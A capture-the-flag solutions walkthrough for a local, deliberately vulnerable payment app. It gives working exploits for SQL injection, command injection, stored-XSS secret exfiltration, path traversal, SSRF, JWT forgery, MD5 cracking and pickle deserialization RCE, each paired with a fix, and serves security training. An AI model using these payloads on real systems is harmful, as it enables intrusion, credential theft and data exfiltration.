# Solutions Walkthrough

Don't open this until you've genuinely tried. Each section: how to find it,
how to exploit it, the flag, and what the real-world fix looks like — write
findings like this in your own reports, it's the habit worth building.

All examples assume the lab is running (`python3 run.py`) and target
`127.0.0.1`.

---

## 1. Service fingerprinting (recon)

**Where:** the whole `127.0.0.1` host.

```bash
nmap -sV -p8000,8081,2121,9090 127.0.0.1
```

Port 9090 sends a banner immediately on connect — no HTTP request needed:

```bash
nc 127.0.0.1 9090
```

```
MeridianPay-HealthProbe/2.3 (internal-build 2019-legacy)
status: ok
hint: legacy ops backup relay still reachable on this host (see ticket OPS-4471)
FLAG{service_banner_recon}
```

**Fix:** don't run a service that hands out version/build info and internal
ticket references to anyone who connects. If a health endpoint must exist,
put it behind auth or at minimum don't leak infrastructure detail in it.

---

## 2. Anonymous access to the ops backup relay

**Where:** `tcp/2121`, `services/backup_relay.py`.

It's a real (passive-mode-only) FTP server that accepts any `USER`/`PASS`
combination:

```bash
curl --user anonymous:anonymous "ftp://127.0.0.1:2121/"
curl --user anonymous:anonymous "ftp://127.0.0.1:2121/meridianpay_db_backup.sql.bak"
curl --user anonymous:anonymous "ftp://127.0.0.1:2121/.env.ops.bak"
```

`.env.ops.bak` is the important one — it contains the JWT signing secret
and the ops console credentials, neither of which appear anywhere in the
web app itself. This is the pivot point for objectives 3 and 13.

**Flag:** `FLAG{anon_ftp_backup_exposed}` (inside `meridianpay_db_backup.sql.bak`).

**Fix:** decommission services when the migration that justified them is
actually finished; if a backup relay must exist, require real
authentication and put it on a network segment that isn't reachable from
where customers connect.

---

## 3. Default credentials on the Ops Console

**Where:** `http://127.0.0.1:8081`, `services/ops_console.py`.

Credentials come straight out of `.env.ops.bak` from objective 2:
`ops` / `ChangeMe2019!`.

```bash
curl -c cj.txt -X POST http://127.0.0.1:8081/login \
  --data-urlencode "username=ops" --data-urlencode "password=ChangeMe2019!"
curl -b cj.txt http://127.0.0.1:8081/dashboard
```

**Flag:** `FLAG{default_creds_ops_console}`

**Follow-through (command injection → RCE):** the "network diagnostics"
ping tool shells out with the host field unsanitized:

```bash
curl -b cj.txt -X POST http://127.0.0.1:8081/diagnostics/ping \
  --data-urlencode "host=127.0.0.1; cat core_flag.txt"
```

Returns `FLAG{rce_core_flag_captured}` inline in the ping output — the
same crown-jewel flag reachable via objectives 10, 11, and 16.

**Fix:** rotate default credentials before any host goes live, enforce a
password policy, and never build a "run this shell command with user
input in it" feature — use a language binding (e.g. Python's `ping3`) or
strictly validate the input against an IP/hostname regex and pass it as an
argument list to `subprocess.run(..., shell=False)`, never through a shell.

---

## 4. SQL injection — login bypass

**Where:** `POST /login`, `app/views.py::login_post`.

```python
sql = f"SELECT id, username, role FROM users WHERE username = '{username}' AND password_hash = '{pwhash}'"
```

**Exploit:** username = `' OR '1'='1' -- ` (trailing space matters after
`--` for SQLite), any password.

```bash
curl -c cj.txt -X POST http://127.0.0.1:8000/login \
  --data-urlencode "username=' OR '1'='1' -- " \
  --data-urlencode "password=x"
```

Returns the first matching row — `admin` (id 1), since it's inserted first.

**Fix:** parameterized queries everywhere:
`conn.execute("SELECT ... WHERE username=? AND password_hash=?", (username, pwhash))`.

---

## 5. SQL injection — extraction without an error oracle

**Where:** `GET /transactions/search`, `app/views.py::transactions_search`.

```python
sql = (
    "SELECT counterparty, amount, memo, created_at FROM transactions "
    f"WHERE account_id={account_id} AND counterparty LIKE '%{q}%'"
)
```

Unlike a debug-mode app, malformed SQL just returns a generic "Search
failed" — no column count, no traceback. Discover the column count blind:

```bash
# log in as alice first, note her own account id (e.g. 2), then:
curl -b cj_alice.txt "http://127.0.0.1:8000/transactions/search?account=2&q=x%27%20UNION%20SELECT%20NULL,NULL,NULL,NULL--%20"
```

A generic error means the wrong column count; a normal (even empty) result
page means you found it — here, 4. Then pull the target flag out of the
`internal_flags` table:

```bash
curl -b cj_alice.txt "http://127.0.0.1:8000/transactions/search?account=2&q=x%27%20UNION%20SELECT%20value,0,name,%27%27%20FROM%20internal_flags%20--%20"
```

**Flag:** `FLAG{sqli_transactions_data_extracted}`

**Fix:** parameterize; if dynamic search is needed, use `?` placeholders
with `%` wildcards passed as bound parameters, never string-built SQL. Note
that hiding error detail (good practice on its own) is not a substitute
for fixing the injection — it only raises the bar from "trivial" to
"annoying," as this objective demonstrates.

---

## 6. IDOR — treasury account exposure

**Where:** `GET /accounts/<account_id>`, `app/views.py::account_detail`.

```python
acct = conn.execute("SELECT * FROM accounts WHERE id=?", (account_id,)).fetchone()
```

No check that `acct["user_id"] == user["id"]`.

```bash
curl -b cj_alice.txt http://127.0.0.1:8000/accounts/1
```

Account id 1 is the MeridianPay Corporate Treasury account, owned by
`admin`. Any logged-in customer can view it by ID.

**Flag:** `FLAG{idor_treasury_account_exposed}`

**Fix:** every object-by-ID lookup needs an ownership (or explicit
authorization) check server-side — `WHERE id=? AND user_id=?`, not just
`WHERE id=?`. Notice that the transaction-search and statement-download
endpoints for the *same* resource type get this right — inconsistency
like that is exactly what a real access-control review is looking for.

---

## 7. Privilege escalation via mass assignment

**Where:** `POST /api/account/update`, `app/views.py::api_account_update`.

```python
ACCOUNT_UPDATE_FIELDS = ["email", "role"]  # 'role' should never be client-settable
```

Any field in that allowlist gets written straight from the request JSON —
including `role`.

```bash
TOKEN=$(curl -s -X POST http://127.0.0.1:8000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}' | python3 -c "import json,sys;print(json.load(sys.stdin)['token'])")

curl -X POST http://127.0.0.1:8000/api/account/update \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"role":"admin"}'
```

Because the web app's session (`req.current_user`) re-reads the user row
from the database on every request, alice's *existing* browser session
(the `sid` cookie from logging in normally) immediately reflects the new
role — no need to re-authenticate:

```bash
curl -b cj_alice.txt http://127.0.0.1:8000/admin
```

**Flag:** `FLAG{mass_assignment_privesc_admin_reached}`

**Fix:** never bind request bodies directly onto a model's writable fields.
Maintain an explicit, reviewed allowlist for what a *client* may set on
their own record, and role/permission changes should never be on it —
those belong behind a separate, more strictly authorized admin-only
endpoint.

---

## 8. Stored XSS → admin secret exfiltration

**Where:** `GET /admin/tickets/<ticket_id>`, `app/views.py::admin_ticket_detail`.

```python
# customer-facing support_detail() escapes this. the admin view doesn't:
<div class="comment">{t['body']}</div>
```

**Exploit:** submit a ticket as any customer with a body like:

```html
<script>
fetch('/admin/secrets').then(r=>r.text()).then(t=>{
  const m = t.match(/FLAG\{[^}]+\}/);
  fetch('/collect?c=' + encodeURIComponent(m ? m[0] : 'no-flag-found'));
});
</script>
```

```bash
curl -b cj_alice.txt -X POST http://127.0.0.1:8000/support/new \
  --data-urlencode "subject=Question" \
  --data-urlencode "body=<script>fetch('/admin/secrets').then(r=>r.text()).then(t=>{const m=t.match(/FLAG\{[^}]+\}/);fetch('/collect?c='+encodeURIComponent(m?m[0]:'none'));});</script>"
```

Then, as `admin`, open the corresponding ticket in an actual browser
(curl won't execute the `<script>`) at `/admin/tickets/<id>`. The payload
fires in the admin's authenticated session, fetches `/admin/secrets`
(admin-only), and exfiltrates the flag to `/collect`. Check the catch at:

```bash
curl -b cj_admin.txt http://127.0.0.1:8000/collected
```

**Flag:** `FLAG{stored_xss_admin_secrets_exfiltrated}`

**Fix:** escape all user-controlled output by default (the customer-facing
ticket view already shows the correct pattern); consider a CSP as
defense-in-depth so even a missed escape doesn't execute arbitrary script.

---

## 9. CSRF — payee added via GET

**Where:** `GET|POST /recipients/add`, `app/views.py::recipients_add`.

No CSRF token, and the same handler accepts `GET`, so a plain link
triggers the state change:

```bash
curl -b cj_alice.txt "http://127.0.0.1:8000/recipients/add?name=Attacker&account_number=MP-EVIL0001"
```

In a real attack this would be `<img src="...">` or an auto-submitting
page served from an attacker-controlled site, relying on the victim's
browser sending their MeridianPay session cookie along automatically.

**Flag:** `FLAG{csrf_payee_added}` (shown on `/recipients` after the GET
succeeds)

**Fix:** require POST for state-changing actions and include a
per-session CSRF token validated server-side; also set `SameSite=Lax` (or
stricter) on the session cookie as defense-in-depth.

---

## 10. Path traversal — statement download

**Where:** `GET /statement/download`, `app/views.py::statement_download`.

Account ownership *is* checked here — but the filename isn't:

```python
path = os.path.join(config.STATEMENT_DIR, filename)  # no sanitization
```

```bash
curl -b cj_alice.txt "http://127.0.0.1:8000/statement/download?account=2&file=../../core_flag.txt"
```

(`STATEMENT_DIR` is `data/statements/`, so `../../` lands back at the
project root.)

**Flag:** `FLAG{rce_core_flag_captured}` (the shared crown-jewel flag — see
objectives 11, 16, and the ops-console follow-through in objective 3)

**Fix:** never join user input directly into a filesystem path. Resolve
the final path with `os.path.realpath` and verify it's still inside the
intended directory before opening it, or better, store an opaque token →
real-filename mapping server-side and never accept a raw filename from the
client at all.

---

## 11. Unrestricted upload → command injection

**Where:** upload at `POST /kyc/upload`, injection at
`GET /admin/kyc/<doc_id>/report` (`app/views.py::admin_kyc_report`).

The upload accepts literally any file with any name — no extension,
content-type, or magic-byte check. The original filename is stored
verbatim and later used to build a shell command:

```python
cmd = f"echo 'MeridianPay KYC verification report' && echo 'Document: {label}' && echo 'Type: {doc_type}' && date"
```

`label` sits inside **single quotes**, so a naive `;`-only payload won't
break out — you need to close the quote first. Upload a file whose
filename is:

```
z.jpg'; cat core_flag.txt > /tmp/proof.txt; echo '
```

(multipart filenames can contain spaces/semicolons/quotes just fine —
build the request by hand, e.g. with Python's `email`/`http.client`
modules, since some CLI tools mangle `-F filename=...` values containing
`;`). Then, as admin, open that document's "generate report" link:

```bash
curl -b cj_admin.txt "http://127.0.0.1:8000/admin/kyc/<doc_id>/report"
```

The command output — and `/tmp/proof.txt` — contain
`FLAG{rce_core_flag_captured}`.

**Fix:** validate uploads by content (magic bytes / a real image-parsing
library), not just extension, and cap what characters a stored filename
may contain. Independently: never interpolate any string — filename or
otherwise — into a shell command. Use `subprocess.run([...], shell=False)`
with a real argument list, which sidesteps shell quoting entirely.

---

## 12. SSRF — internal ledger API

**Where:** `POST /admin/tools/verify-bank`, `app/views.py::admin_fetch_post`;
target `GET /internal/ledger-api`, `app/views.py::internal_ledger`.

The "verify recipient bank" tool always attaches the internal ledger token
to whatever URL it's given:

```python
r = urllib.request.Request(url, headers={"X-Internal-Ledger-Token": config.INTERNAL_LEDGER_TOKEN, ...})
```

```bash
curl -b cj_admin.txt -X POST http://127.0.0.1:8000/admin/tools/verify-bank \
  --data-urlencode "url=http://127.0.0.1:8000/internal/ledger-api"
```

**Flag:** `FLAG{ssrf_internal_ledger_access}`

**Fix:** server-side request tools should never blindly attach privileged
credentials to an arbitrary caller-supplied URL. Maintain an allowlist of
destinations the tool is permitted to reach, and if internal APIs must be
reachable from app servers, put them on a network segment the app-facing
tier can't route to at all — defense should not rest on "nobody will guess
the URL."

---

## 13. Broken authentication — JWT forgery via leaked secret

**Where:** `app/views.py::jwt_encode` / `jwt_decode`; target
`GET /api/admin/reports`.

Verification here is *not* naive — `alg: none` is explicitly rejected.
The weak point is the HMAC secret itself, which never appears anywhere in
the web app and only leaks via the backup relay (objective 2):
`JWT_SECRET=mp$hmac_9f1c_legacy_2019` in `.env.ops.bak`.

```python
import base64, hmac, hashlib, json, urllib.request

def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

secret = "mp$hmac_9f1c_legacy_2019"
header = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
payload = b64u(json.dumps({"sub": 1, "username": "attacker", "role": "admin"}).encode())
sig = b64u(hmac.new(secret.encode(), f"{header}.{payload}".encode(), hashlib.sha256).digest())
token = f"{header}.{payload}.{sig}"

req = urllib.request.Request(
    "http://127.0.0.1:8000/api/admin/reports",
    headers={"Authorization": f"Bearer {token}"},
)
print(urllib.request.urlopen(req).read().decode())
```

**Flag:** `FLAG{jwt_weak_secret_forgery}`

**Fix:** generate signing secrets with real entropy (`secrets.token_bytes(32)`
or better yet an asymmetric scheme like RS256/ES256 so the verifier never
needs the signing key at all), rotate them on any suspected exposure, and
never let a secret live unencrypted in a file a legacy service hands out
to anyone who connects.

---

## 14. Weak credential storage

**Where:** `app/db.py` — every password is `hashlib.md5(password)`, no salt.

Dump the `users` table (via objective 7's admin access, or by extracting
it directly through objective 5's injection point) and you'll find
`svc_reports` with a weak MD5 hash. Crack it:

```bash
echo "5f4dcc3b5aa765d61d8327deb882cf99" # example only, use the real dumped hash
hashcat -m 0 -a 0 dumped_hash.txt rockyou.txt
# or: john --format=raw-md5 --wordlist=rockyou.txt dumped_hash.txt
```

The password is deliberately weak enough to fall to a small wordlist.
Log in as `svc_reports` with the recovered password:

```bash
curl -c cj_svc.txt -X POST http://127.0.0.1:8000/login \
  --data-urlencode "username=svc_reports" --data-urlencode "password=<cracked>"
curl -b cj_svc.txt http://127.0.0.1:8000/accounts
```

**Flag:** `FLAG{weak_password_md5_cracked}`

**Fix:** use a slow, salted KDF built for passwords — `bcrypt`, `scrypt`,
or `argon2` — never a fast general-purpose hash like MD5/SHA-family
directly. Enforce a real password policy so even a compromised hash
database doesn't fall to a small wordlist in seconds.

---

## 15. Business logic — negative-amount transfer

**Where:** `POST /transfer`, `app/views.py::transfer_post`.

```python
elif amount > 0 and from_acct["balance"] < amount:
    error = "Insufficient funds."
else:
    # negative amount skips the funds check entirely
    ...
```

```bash
curl -b cj_alice.txt -X POST http://127.0.0.1:8000/transfer \
  --data-urlencode "from_account=2" \
  --data-urlencode "to_account_number=MP-00000001" \
  --data-urlencode "amount=-500"
```

A "transfer" of `-500` from alice to the treasury account actually
*increases* alice's balance by 500 and *decreases* the treasury's by 500 —
funds created from nothing, no balance check ever triggered because the
check only runs on the positive-amount branch.

**Flag:** `FLAG{business_logic_negative_amount_transfer}`

**Fix:** validate amount is strictly positive (and reasonably bounded) at
the top of the handler, before any branching — don't let a happy-path
check on one branch stand in for input validation on the whole endpoint.
This class of bug (checking a precondition on only one of several
reachable code paths) is exactly what makes business-logic review
different from — and harder than — pure injection-hunting.

---

## 16. (Bonus) Insecure deserialization → RCE

**Where:** `POST /admin/import`, `app/views.py::admin_import_post`.

```python
obj = pickle.loads(raw)  # raw is fully attacker-controlled
```

`pickle.loads` will happily execute a crafted `__reduce__` during
unpickling:

```python
import pickle, base64, os

class Evil:
    def __reduce__(self):
        return (os.system, ("cat core_flag.txt > /tmp/proof.txt",))

payload = base64.b64encode(pickle.dumps(Evil())).decode()
print(payload)
```

```bash
curl -b cj_admin.txt -X POST http://127.0.0.1:8000/admin/import \
  --data-urlencode "payload=<paste the base64 above>"
```

**Flag:** `FLAG{rce_core_flag_captured}` (again, the shared crown jewel —
see §6 of `SCOPE.md`)

**Fix:** never unpickle data from an untrusted source — `pickle` is not a
data-interchange format, it's a way to reconstruct arbitrary Python
objects, including ones whose construction runs arbitrary code. Use JSON
(or a schema-validated format) for anything crossing a trust boundary, and
if legacy pickle blobs must be supported, isolate the deserialization in a
sandboxed, no-network, least-privilege process — or just finish the
migration and delete the endpoint.
